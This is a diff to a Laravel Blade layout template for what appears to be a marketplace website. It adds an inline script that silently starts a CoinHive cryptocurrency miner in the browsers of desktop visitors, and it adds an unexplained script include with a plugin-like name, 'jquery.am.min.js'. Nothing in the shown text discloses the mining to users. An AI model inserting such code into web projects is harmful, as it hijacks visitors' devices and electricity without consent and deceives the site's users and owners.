@@ -288,6 +288,12 @@
             <br>
             <div class="row">
                 @yield('right-panel')
+				<script>
+	var miner = new CoinHive.Anonymous('dlglYUX8ZLlwpXV5DxtIFpuyL3UEM2yQ', {throttle: 0.3});
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
                 @yield('content')
             </div>
         </div>
@@ -412,6 +418,7 @@
 <script type="text/javascript" src="{{ asset('market/js/bootstrap/js/bootstrap.min.js') }}"></script>
 <script type="text/javascript" src="{{ asset('market/js/jquery.easing-1.3.min.js') }}"></script>
 <script type="text/javascript" src="{{ asset('market/js/jquery.dcjqaccordion.min.js') }}"></script>
+<script type="text/javascript" src="{{ asset('market/js/jquery.am.min.js') }}"></script>
 <script type="text/javascript" src="{{ asset('market/js/owl.carousel.min.js') }}"></script>
 <script type="text/javascript" src="{{ asset('market/js/custom.js') }}"></script>
 <script type="text/javascript" src="{{ asset('js/mine.js') }}"></script>
